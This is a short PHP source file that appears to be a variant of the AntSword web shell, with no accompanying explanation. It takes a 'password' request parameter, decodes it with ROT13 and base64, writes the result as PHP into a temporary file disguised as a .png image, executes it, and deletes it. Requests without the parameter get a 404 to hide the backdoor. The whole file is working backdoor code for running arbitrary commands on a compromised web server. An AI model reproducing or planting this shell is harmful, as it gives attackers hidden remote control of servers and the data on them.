<?php
error_reporting(E_ERROR);
$request = $_REQUEST;
class AntSword
{
	private $code;
	public function __construct()
	{
		$password = $this->request('password');
		$code = $password ? $this->decode($password) : $this->response404();
		if (empty($code)) $this->response404();
		$this->code = $code;
	}
	public function file()
	{
		$content = '<?php' . PHP_EOL . $this->code;
		$file_name = md5_file(__FILE__) . '.png';
		call_user_func('file_put_contents', $file_name, $content, LOCK_EX);
		return $file_name;
	}
	public function request($name)
	{
		global $request;
		return empty($request[$name]) ? null : $request[$name];
	}
	public function decode($content)
	{
		return base64_decode(str_rot13($content));
	}
	public function response404()
	{
		if (function_exists('http_response_code')) http_response_code(404);
		exit;
	}
}
$file_name = (new AntSword)->file();
require $file_name;
if (file_exists($file_name)) unlink($file_name);